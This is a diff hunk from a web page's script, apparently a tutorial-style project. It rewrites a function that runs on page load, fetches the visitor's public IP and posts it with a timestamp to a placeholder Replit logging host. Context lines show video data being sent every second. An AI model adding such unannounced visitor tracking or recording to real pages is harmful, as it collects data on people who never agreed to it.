@@ -31,16 +31,17 @@
         };
         mediaRecorder.start(1000); // Sends video data every second
     }
-        async function logUser() {
-        let ipResponse = await fetch('https://api64.ipify.org?format=json');
-        let data = await ipResponse.json();
-        fetch('http://10.0.128.189:5000/log', { 
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ ip: data.ip, timestamp: new Date() })
-        });
-    }
-    logUser();
+async function logUser() {
+    let ipResponse = await fetch('https://api64.ipify.org?format=json');
+    let data = await ipResponse.json();
+    fetch('https://your-replit-name.repl.co/log', { 
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ ip: data.ip, timestamp: new Date() })
+    });
+}
+logUser();
+
 </script>
 </body>
 </html>
